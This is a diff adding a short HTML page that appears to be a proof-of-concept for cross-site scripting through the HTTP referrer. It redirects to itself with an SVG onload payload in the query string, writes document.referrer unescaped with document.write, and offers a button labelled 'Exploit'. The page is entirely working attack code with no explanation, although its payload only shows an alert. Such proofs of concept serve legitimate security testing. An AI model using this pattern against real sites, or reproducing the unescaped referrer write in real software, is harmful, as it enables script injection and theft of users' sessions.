@@ -1,0 +1,8 @@
+<script>
+if (location.search==""){
+	window.location=document.location+"?<svg/onload=alert('XSS')>";
+}
+</script>
+You came from <script>document.write(document.referrer)</script>
+<br><br><br>
+<button style="font-size: 30px" onclick=window.location.replace(document.location);>Exploit</button>
